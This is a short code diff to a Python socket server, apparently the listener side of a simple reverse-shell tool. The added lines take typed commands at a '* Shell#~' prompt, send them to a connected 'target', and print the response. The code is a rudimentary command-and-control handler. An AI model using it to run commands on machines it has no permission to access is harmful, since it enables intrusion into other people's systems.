@@ -8,5 +8,10 @@ s.listen(5)
 
 print("Listening for incoming connections")
 target, ip = s.accept()
-print('Target connected!', target)
+print('Target connected!')
+
+message = input("* Shell#~%s: " % str(ip))
+target.send(message.encode())
+answer = target.recv(1024).decode()
+print(answer)
 s.close()
